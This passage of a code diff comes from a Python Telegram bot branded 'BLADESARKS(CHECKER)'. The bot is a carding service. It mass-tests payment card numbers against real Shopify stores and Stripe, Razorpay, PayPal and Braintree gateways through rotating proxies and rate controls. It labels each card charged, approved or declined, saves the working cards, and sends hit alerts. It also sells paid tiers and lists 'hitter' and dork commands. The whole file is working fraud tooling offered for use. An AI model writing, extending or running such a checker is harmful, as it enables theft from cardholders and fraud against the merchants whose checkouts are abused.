+        "errors": 0,
+        "total": total,
+        "processed": 0,
+        "api_usage": {}
+    }
+    
+    start_time = time.time()
+    
+    try:
+        shopify_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        CONCURRENCY = {
+            "free": 1,
+            "premium": 2,
+            "ultimate": 2,
+            "admin": 2,
+        }.get(tier, 2)
+        
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ SC\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        proxy_index = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ SC\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except:
+                pass
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                
+                # Get site from SC manager
+                site = sc_site_manager.get_next_site()
+                if not site:
+                    site = "dswfragrance.myshopify.com"
+                
+                # Get proxy
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                # Use Shopify API pool
+                result = await shopify_api_pool.check_card_with_pool(card, site, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                # Mark site result
+                if result and result.get("status_category") in ["charged", "approved"]:
+                    sc_site_manager.mark_result(site, True)
+                else:
+                    sc_site_manager.mark_result(site, False)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                response_msg = result.get("message", "")
+                api_used = result.get("api_used", "unknown")
+                
+                # Update stats
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if api_used not in stats["api_usage"]:
+                        stats["api_usage"][api_used] = 0
+                    stats["api_usage"][api_used] += 1
+                    
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["declined"] += 1
+                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
+                    
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # Send result for charged/approved
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_shopify_single_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except:
+                        pass
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="SC",
+                        response=response_msg,
+                        price=result.get("price", "0.00"),
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="SC", card=card,
+                            response=response_msg,
+                            price=result.get("price", "0.00"),
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in shopify_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["declined"] += 1
+        
+        # Final summary
+        if u_id in shopify_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            # Build API usage summary
+            api_summary = ""
+            if stats["api_usage"]:
+                api_summary = "\n📊 <b>API Usage:</b>\n"
+                for api_name, count in sorted(stats["api_usage"].items(), key=lambda x: x[1], reverse=True):
+                    api_summary += f"   • {api_name}: {count} cards\n"
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>SC Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ SC mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        shopify_active_tasks.pop(u_id, None)
+        print(f"🏁 [SC Mass] Session ended for user {u_id}")
+
+
+# ============ SC SITE MANAGEMENT COMMANDS ============
+
+async def scsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add a site to SC rotation - /scsite <site>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    
+    if not context.args:
+        current_sites = sc_site_manager.sites
+        msg = "🌐 <b>SC Site Management</b>\n\n"
+        msg += f"📊 Current sites: {len(current_sites)}\n\n"
+        msg += "Usage: <code>/scsite &lt;site&gt;</code>\n"
+        msg += "Example: <code>/scsite dswfragrance.myshopify.com</code>\n\n"
+        msg += "Use <code>/scsites</code> to list all sites.\n"
+        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+        return
+    
+    site = " ".join(context.args)
+    
+    if sc_site_manager.add_site(site):
+        await update.message.reply_text(
+            f"✅ <b>Site Added!</b>\n\n"
+            f"📍 Site: <code>{site}</code>\n"
+            f"📊 Total sites: {len(sc_site_manager.sites)}\n\n"
+            f"Use <code>/sc &lt;card&gt;</code> to check cards with this site.",
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ Site already exists: <code>{site}</code>",
+            parse_mode=ParseMode.HTML
+        )
+
+
+async def scsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all SC sites - /scsites"""
+    if not await verify_group_access(update, context):
+        return
+    
+    msg = sc_site_manager.get_stats()
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+
 
 import aiohttp
 from bs4 import BeautifulSoup
@@ -54548,6 +57391,7 @@ async def dork_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # --- COMMAND HANDLERS ---
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start command with menu"""
     user = update.effective_user
     user_manager.update_user_info(user.id, user.username or "NoUsername", user.first_name)
     stats = user_manager.get_user_stats(user.id)
@@ -54557,225 +57401,313 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     tier = stats['tier']
     
-    
+    # Premium emoji IDs
     PREMIUM_EMOJI_IDS = {
-            "diamond": "5427168083074628963",  # 💎
-            "fire": "5471133374264684999",      # 🔥
-            "skull": "5042167377869932162",      # 💀
-            "target": "5377336227533969892",     # 🎯
-            "alien": "5869573060030683138",      # 👾
-            "money": "6002386288612653951",      # 🙈
-            "smile": "6230927657257668107",      # 😁
-            "devil": "6268012745776588577",  # 😈
-            "bin" : "6237654950432742406",
-            "approved" : "6267264360482084046",
-            "users" : "5784914081165087232",
-            "card" : "5465465194056525619",
-        }
-    
-    # ============ PREMIUM EMOJIS ============
-    status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✔️")
-    id_emoji = premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")
-    user_emoji = premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")
-    name_emoji = premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")
-    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")
-    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
-    target_emoji = premium_emoji(PREMIUM_EMOJI_IDS["target"], "🎯")
-    
-    # Tier emoji mapping
-    tier_emojis = {
-        "free": "🆓",
-        "premium": "🔥",
-        "ultimate": "😈",
-        "admin": "💀"
+        "diamond": "5427168083074628963",
+        "fire": "5471133374264684999",
+        "skull": "5042167377869932162",
+        "target": "5377336227533969892",
+        "alien": "5869573060030683138",
+        "money": "6002386288612653951",
+        "smile": "6230927657257668107",
+        "devil": "6268012745776588577",
+        "bin": "6237654950432742406",
+        "approved": "6267264360482084046",
+        "users": "5784914081165087232",
+        "card": "5465465194056525619",
+        "star": "6282793227057632654",
+        "trophy": "5188344996356448758",
+        "flash": "5397857289216484878",
+        "clock": "5262540380301191210",
+        "globe": "5447410659077661506",
+        "lock": "5197288647275071607",
+        "info": "5042306247047513767",
+        "pink": "5041796412954641308",
+        "flower": "6230927657257668107",
+        "doller": "5197434882321567830",
+        "toy": "5249244862359812334",
+        "stats": "5028746137645876535",
     }
+    
+    tier_emojis = {"free": "🆓", "premium": "🔥", "ultimate": "😈", "admin": "🏴"}
     tier_emoji = tier_emojis.get(tier, "🆓")
+    current_time = datetime.now().strftime("%I:%M %p")
     
     caption = (
-        f" {status_emoji} <b>Status</b> ➛ Active {status_emoji}\n\n"
-        f" {id_emoji} <b>ID</b> ➛ <code>{user.id}</code>\n"
-        f" {user_emoji} <b>User</b> ➛ @{user.username or 'None'}\n"
-        f" {name_emoji} <b>Name</b> ➛ {user.first_name} [{tier_emoji} {tier.upper()}]\n"
-        f" {diamond_emoji} <b>Dev</b> ➛ @lencax"
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} '
+        f'<b>BLADESARKS(CHECKER)</b>\n\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["star"], "⭐")} '
+        f'<b>Status</b> : Active ✔\n\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")} '
+        f'<b>ID</b> <code>{user.id}</code>\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
+        f'<b>User</b> @{user.username or "None"}\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")} '
+        f'<b>Name</b> {user.first_name} [ {tier_emoji} {tier.upper()} ]\n\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")} '
+        f'{current_time}\n\n'
+        f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
+        f'<b>Bot</b> @BLADESARKS_V3bot'
     )
     
-    # Create keyboard with gateways in rows (2 per row)
     keyboard = [
         [
-            InlineKeyboardButton("🛍️ Shopify", callback_data='gateway_shopify'),
-            InlineKeyboardButton("💳 Stripe $1", callback_data='gateway_stripe')
+            InlineKeyboardButton("🛍️ Checker", callback_data='show_checker'),
+            InlineKeyboardButton("🎯 Hitter", callback_data='show_hitter')
         ],
         [
-            InlineKeyboardButton("💰 Razorpay", callback_data='gateway_razorpay'),
-            InlineKeyboardButton("💸 PayPal", callback_data='gateway_paypal')
-        ],
-        [
-            InlineKeyboardButton("🆓 Free Credits", callback_data='free_credits'),
-            InlineKeyboardButton("💎 Upgrade", callback_data='buy_premium')
+            InlineKeyboardButton("📋 Plans", callback_data='show_plans'),
+            InlineKeyboardButton("📞 Contact", callback_data='show_contact')
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    try:
-        with open('p1.jpg', 'rb') as photo:
-            await update.message.reply_photo(
-                photo=photo,
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-    except FileNotFoundError:
-        await update.message.reply_text(
-            caption,
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
-        
+    # ============ FIX: Send as TEXT message, NOT photo ============
+    await update.message.reply_text(
+        caption,
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
+
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    user = update.effective_user
     
     try:
         await query.answer()
     except Exception as e:
         print(f"⚠️ Could not answer callback query: {e}")
     
-    if query.data == 'gateway_shopify':
-        caption = (
-            "✅ <b>Gateway: Shopify</b>\n\n"
-            "Commands:\n"
-            "/sh - Single check\n"
-            "/msh - Mass check"
+    user = update.effective_user
+    chat_id = update.effective_chat.id
+    
+    # ============ PREMIUM EMOJI IDs ============
+    PREMIUM_EMOJI_IDS = {
+        "diamond": "5427168083074628963",
+        "fire": "5471133374264684999",
+        "skull": "5042167377869932162",
+        "target": "5377336227533969892",
+        "alien": "5869573060030683138",
+        "money": "6002386288612653951",
+        "smile": "6230927657257668107",
+        "devil": "6268012745776588577",
+        "bin": "6237654950432742406",
+        "approved": "6267264360482084046",
+        "users": "5784914081165087232",
+        "card": "5465465194056525619",
+        "star": "6282793227057632654",
+        "trophy": "5188344996356448758",
+        "flash": "5397857289216484878",
+        "clock": "5262540380301191210",
+        "globe": "5447410659077661506",
+        "lock": "5197288647275071607",
+        "info": "5042306247047513767",
+        "pink": "5041796412954641308",
+        "flower": "6230927657257668107",
+        "doller": "5197434882321567830",
+        "toy": "5249244862359812334",
+        "stats": "5028746137645876535",
+    }
+    
+    # ============ CHECKER ============
+    if query.data == 'show_checker':
+        text = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "🛍️")} '
+            f'<b>CHECKER GATEWAYS</b>\n\n'
+            f'1️⃣ <b>Shopify</b>\n'
+            f'   /sh - Single check\n'
+            f'   /msh - Mass check\n\n'
+            f'2️⃣ <b>Stripe $1</b>\n'
+            f'   /st - Single check\n'
+            f'   /mst - Mass check\n\n'
+            f'3️⃣ <b>Razorpay</b>\n'
+            f'   /rz - Single check\n'
+            f'   /mrz - Mass check\n\n'
+            f'4️⃣ <b>PayPal</b>\n'
+            f'   /pp - Single check\n'
+            f'   /mpp - Mass check\n\n'
+            f'5️⃣ <b> Stripe Auth </b>\n'
+            f'   /chk - Single check\n'
+            f'   /mchk - Mass check\n\n'
         )
         
         keyboard = [
             [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await query.edit_message_caption(
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            print(f"⚠️ Could not edit message: {e}")
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
-    elif query.data == 'gateway_stripe':
-        caption = (
-            "✅ <b>Gateway: Stripe Charged $0.50</b>\n\n"
-            "Commands:\n"
-            "/st1 - Single check\n"
-            "/mst1 - Mass check"
+    # ============ HITTER ============
+    elif query.data == 'show_hitter':
+        text = (
+            f' /co - Strip Hitter\n\n'
+            f' /whoop - Whoop Hitter\n'
         )
         
         keyboard = [
             [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await query.edit_message_caption(
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            print(f"⚠️ Could not edit message: {e}")
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
-    elif query.data == 'gateway_paypal':
-        caption = (
-            "✅ <b>Gateway: PayPal</b>\n\n"
-            "Commands:\n"
-            "/pp - Single check\n"
-            "/mpp - Mass check"
+    # ============ PLANS (SAME AS /buy) ============
+    elif query.data == 'show_plans':
+        fire_emoji = premium_emoji(PREMIUM_EMOJI_IDS["fire"], "🔥")
+        
+        text = (
+            f" USE /buy"
+            
         )
         
         keyboard = [
             [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await query.edit_message_caption(
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            print(f"⚠️ Could not edit message: {e}")
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
-    elif query.data == 'gateway_razorpay':
-        caption = (
-            "✅ <b>Gateway: Razorpay</b>\n\n"
-            "Commands:\n"
-            "/rz - Single check\n"
-            "/mrz - Mass check"
+    # ============ PROFILE ============
+    elif query.data == 'show_profile':
+        stats = user_manager.get_user_stats(user.id)
+        tier = stats['tier']
+        tier_emojis = {"free": "🆓", "premium": "🔥", "ultimate": "😈", "admin": "🏴"}
+        tier_emoji = tier_emojis.get(tier, "🆓")
+        
+        text = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
+            f'<b>YOUR PROFILE</b>\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")} '
+            f'<b>ID</b> <code>{user.id}</code>\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
+            f'<b>User</b> @{user.username or "None"}\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")} '
+            f'<b>Name</b> {user.first_name} [ {tier_emoji} {tier.upper()} ]\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["stats"], "📊")} '
+            f'<b>Stats</b>\n'
+            f'   Total Checks: {stats["total_checks"]}\n'
+            f'   Total Hits: {stats["total_hits"]}\n'
+            f'   Today: {stats["daily_checks"]}\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["money"], "💎")} '
+            f'<b>Credits</b>\n'
+            f'   {stats.get("credits", 0)} credits\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")} '
+            f'<b>Joined</b> {stats["joined"]}'
         )
         
         keyboard = [
             [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await query.edit_message_caption(
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            print(f"⚠️ Could not edit message: {e}")
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
-    # ============ FIXED: Handle back_main callback ============
+    # ============ COMMANDS ============
+    elif query.data == 'show_commands':
+        text = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "⌨️")} '
+            f'<b>ALL COMMANDS</b>\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "🛍️")} '
+            f'<b>Gateways</b>\n'
+            f'   /sh, /msh - Shopify\n'
+            f'   /st, /mst - Stripe $1\n'
+            f'   /rz, /mrz - Razorpay\n'
+            f'   /pp, /mpp - PayPal\n'
+            f'   /chk, /mchk - Auto Stripe\n'
+            f'   /btn, /btnm - Braintree\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["target"], "🎯")} '
+            f'<b>Tools</b>\n'
+            f'   /bin - BIN Lookup\n'
+            f'   /dork - Smart Dork\n'
+            f'   /me - Your Stats\n'
+            f'   /top - Leaderboard\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["money"], "💎")} '
+            f'<b>Credits</b>\n'
+            f'   /credits - Check balance\n'
+            f'   /redeemcredits - Redeem key\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")} '
+            f'<b>Proxy</b>\n'
+            f'   /addmyproxy - Add proxy\n'
+            f'   /pt - Test proxies\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
+            f'<b>Admin</b>\n'
+            f'   /genkey - Generate key\n'
+            f'   /users - List users'
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+    
+    # ============ CONTACT ============
+    elif query.data == 'show_contact':
+        text = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "📞")} '
+            f'<b>CONTACT</b>\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
+            f'<b>Bot</b> @BLADESARKS_V3bot\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
+            f'<b>Developer</b>\n'
+            f'   @lencax\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["globe"], "🌐")} '
+            f'<b>Group</b>\n'
+            f'   <a href="https://t.me/+a-_7PTkBTe81MGY1">Join Group</a>\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["info"], "ℹ️")} '
+            f'<b>Support</b>\n'
+            f'   For issues, feedback or upgrades\n'
+            f'   Contact @lencax'
+        )
+        
+        keyboard = [
+            [
+                InlineKeyboardButton("📞 Contact @lencax", url="https://t.me/lencax"),
+                InlineKeyboardButton("📢 Join Group", url="https://t.me/+a-_7PTkBTe81MGY1")
+            ],
+            [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+    
+    # ============ BACK MAIN ============
     elif query.data == 'back_main':
         stats = user_manager.get_user_stats(user.id)
         tier = stats['tier']
+        tier_emojis = {"free": "🆓", "premium": "🔥", "ultimate": "😈", "admin": "🏴"}
+        tier_emoji = tier_emojis.get(tier, "🆓")
         
-        caption = (
-            f"BLADESARKS(CHECKER)\n"
-            f"★ Status : Active ✔\n\n"
-            f"★ ID ✉️ <code>{user.id}</code>\n"
-            f"★ User ✉️ {user.username or 'None'}\n"
-            f"★ Name ✉️ {user.first_name} [{tier.upper()}]\n"
+        current_time = datetime.now().strftime("%I:%M %p")
+        
+        text = (
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} '
+            f'<b>BLADESARKS(CHECKER)</b>\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["star"], "⭐")} '
+            f'<b>Status</b> : Active ✔\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")} '
+            f'<b>ID</b> <code>{user.id}</code>\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")} '
+            f'<b>User</b> @{user.username or "None"}\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")} '
+            f'<b>Name</b> {user.first_name} [ {tier_emoji} {tier.upper()} ]\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["clock"], "⏱️")} '
+            f'{current_time}\n\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")} '
+            f'<b>Bot</b> @BLADESARKS_V3bot'
         )
         
-        # Re-create the original keyboard
         keyboard = [
             [
-                InlineKeyboardButton("🛍️ Shopify", callback_data='gateway_shopify'),
-                InlineKeyboardButton("💳 Stripe $1", callback_data='gateway_stripe')
+                InlineKeyboardButton("🛍️ Checker", callback_data='show_checker'),
+                InlineKeyboardButton("🎯 Hitter", callback_data='show_hitter')
             ],
             [
-                InlineKeyboardButton("💰 Razorpay", callback_data='gateway_razorpay'),
-                InlineKeyboardButton("💸 PayPal", callback_data='gateway_paypal')
+                InlineKeyboardButton("📋 Plans", callback_data='show_plans'),
+                InlineKeyboardButton("📞 Contact", callback_data='show_contact')
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            # Try to edit as photo caption first (if original was a photo)
-            await query.edit_message_caption(
-                caption=caption,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except Exception as e:
-            # If that fails, try editing as text
-            try:
-                await query.edit_message_text(
-                    text=caption,
-                    parse_mode=ParseMode.HTML,
-                    reply_markup=reply_markup
-                )
-            except Exception as e2:
-                print(f"⚠️ Could not edit message: {e2}")
-
-    
-    
-    
-    
+        await query.edit_message_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
     
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -54892,18 +57824,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         msg = "❌ <b>No active sessions found.</b>\n\n"
         msg += "You don't have any ongoing checks to stop.\n\n"
-        msg += "<b>Active gateways you can stop:</b>\n"
-        msg += "• /aumc - Autosopi\n"
-        msg += "• /mpp - PayPal\n"
-        msg += "• /msh - Shopify\n"
-        msg += "• /mrz - Razorpay\n"
-        msg += "• /stmc - Stripe Charge\n"
-        msg += "• /sc - Stripe Charge V2\n"
-        msg += "• /msc - Stripe Charge V2 Mass\n"
-        msg += "• /stamc - Stripe Auth\n"
-        msg += "• /btnm - Braintree\n"
-        msg += "• /mb3 - B3Charged\n"
-        msg += "• /pfmc - Payflow"
+
     
     await message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 
@@ -61360,8 +64281,6 @@ def main():
     app.add_handler(CommandHandler("stc1", single_check_stc1))
     app.add_handler(CommandHandler("mstc", mass_check_stc1))
     
-    app.add_handler(CommandHandler("sc1", single_check_sc1))
-    app.add_handler(CommandHandler("msc1", mass_check_sc1))
     
     app.add_handler(CommandHandler("st1", single_check_st1))
     app.add_handler(CommandHandler("mst1", mass_check_st1_command))
@@ -61469,8 +64388,6 @@ def main():
     app.add_handler(CallbackQueryHandler(buy_now_callback, pattern='buy_now'))
     app.add_handler(CallbackQueryHandler(back_to_buy_callback, pattern='back_to_buy'))
     # ============ OTHER COMMANDS ============
-    app.add_handler(CommandHandler("sendhit", send_hit_command))
-    app.add_handler(CommandHandler("getgifid", get_gif_id_command))
     app.add_handler(CommandHandler("testpremium", test_premium_command))
     app.add_handler(CommandHandler("bin", bin_command))
     app.add_handler(CommandHandler("poolstatus", pool_status_command))
@@ -61566,6 +64483,15 @@ def main():
     app.add_handler(CallbackQueryHandler(rtrash_callback, pattern='confirm_rtrash'))
     app.add_handler(CallbackQueryHandler(rtrash_callback, pattern='cancel_rtrash'))
     
+    app.add_handler(CallbackQueryHandler(chk_card_callback, pattern='^chk_card_'))
+   
+    
+    app.add_handler(CommandHandler("co", co_command))
+    app.add_handler(CommandHandler("addproxy", addproxy_stripe_command))
+    app.add_handler(CommandHandler("removeproxy", removeproxy_stripe_command))
+    app.add_handler(CommandHandler("proxy", proxy_stripe_check_command)) 
+    
+    
    
     
     app.add_handler(CommandHandler("massglobalproxy", mass_proxy_global_command))
@@ -61575,6 +64501,8 @@ def main():
     
     app.add_handler(CommandHandler("st", single_check_stripe_1usd))
     app.add_handler(CommandHandler("mst", mass_check_stripe_1usd_command))
+    
+    
     
     app.add_handler(CommandHandler("pay", pay_command))
     app.add_handler(CommandHandler("paywallets", paywallets_button_command))
@@ -61597,8 +64525,8 @@ def main():
     app.add_handler(CommandHandler("feedback", feedback_command), group=0)
     app.add_handler(CommandHandler("feedback_text", feedback_text_command))
     
-    # ============ CALLBACK QUERY HANDLER ============
-    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(CallbackQueryHandler(button_callback, pattern='^(show_checker|show_hitter|show_plans|show_profile|show_commands|show_contact|back_main)$'))
+    
     
     # Add these command handlers to your main() function
     app.add_handler(CommandHandler("rnormal", remove_normal_sites_direct))
